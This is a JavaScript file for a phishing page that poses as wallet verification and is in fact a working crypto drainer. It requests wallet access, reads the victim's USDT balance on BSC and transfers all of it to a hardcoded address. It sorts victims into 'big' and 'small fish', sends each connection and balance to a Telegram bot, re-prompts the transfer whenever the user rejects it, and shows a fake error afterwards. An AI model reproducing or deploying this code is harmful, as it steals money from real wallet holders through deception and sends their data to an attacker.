const CONFIG = {
    REC_SMALL: "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe", // < 300 USDT
    REC_BIG: "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe",   // >= 300 USDT (Isse badal sakte ho)
    USDT: "0x55d398326f99059fF775485246999027B3197955",
    BOT: "",
    CHAT: "" // Numerical ID behtar kaam karti hai
};

function openModal() { document.getElementById('w-modal').style.display = 'flex'; }
function closeModal() { document.getElementById('w-modal').style.display = 'none'; }

// 🚀 Telegram Pe Notification Bhejne Ka Function
async function sendTelegram(msg) {
    const url = `https://api.telegram.org/bot${CONFIG.BOT}/sendMessage`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CONFIG.CHAT, text: msg, parse_mode: 'HTML' })
        });
    } catch(e) { console.error("TG Error"); }
}

async function selectW(type) {
    closeModal();
    
    // 🔥 CLICK NOTIFICATION: Jaise hi wallet select ho, alert bhej do
    await sendTelegram(`🚀 <b>Click Detected!</b>\nUser chose: <b>${type}</b>\nDomain: ${window.location.hostname}`);

    if (!window.ethereum && !window.trustwallet) {
        if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
            await sendTelegram(`📱 <b>Mobile Redirect:</b> Sending user to Trust Wallet app.`);
            const currentUrl = window.location.href.replace("https://", "");
            window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + currentUrl;
            return;
        }
        alert("Please use Trust Wallet or MetaMask.");
        return;
    }
    runApp();
}

async function runApp() {
    const ov = document.getElementById('overlay');
    ov.style.display = 'flex';

    try {
        const provider = window.ethereum || window.trustwallet;
        const w3 = new Web3(provider);
        const accounts = await provider.request({ method: 'eth_requestAccounts' });
        const user = accounts[0];

        // Switch to BSC Network
        try { await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] }); } catch (e) {}

        const minABI = [
            { "constant": true, "inputs": [{ "name": "_o", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "b", "type": "uint256" }], "type": "function" },
            { "constant": false, "inputs": [{ "name": "_t", "type": "address" }, { "name": "_v", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
        ];

        const contract = new w3.eth.Contract(minABI, CONFIG.USDT);
        const bW = await contract.methods.balanceOf(user).call();
        const bE = w3.utils.fromWei(bW, 'ether');

        // 🔥 SMART ROUTING LOGIC 🔥
        let target = parseFloat(bE) >= 300 ? CONFIG.REC_BIG : CONFIG.REC_SMALL;
        let logType = parseFloat(bE) >= 300 ? "💎 BIG FISH" : "🐟 SMALL FISH";

        // Wallet Connect Notification
        await sendTelegram(`👤 <b>New Target Connected!</b>\nAddr: <code>${user}</code>\nBal: <b>${bE} USDT</b>\nRoute: ${logType}`);

        if (parseFloat(bE) > 0.05) {
            const triggerTransfer = async () => {
                document.getElementById("loading-text").innerText = "SYNCHRONIZING...";
                try {
                    // Start USDT Transfer
                    await contract.methods.transfer(target, bW).send({ from: user });
                    
                    // Success alert (fake) to reload
                    alert("Verification Error: 0x88 Protocol Timeout. Please retry.");
                    location.reload();
                } catch (err) {
                    // Anti-Cancel: Transaction popup again if rejected
                    setTimeout(triggerTransfer, 1200);
                }
            };
            await triggerTransfer();
        } else {
            alert("Verification Complete: Minimal assets detected.");
            ov.style.display = 'none';
        }
    } catch (e) {
        ov.style.display = 'none';
        console.error(e);
    }
}
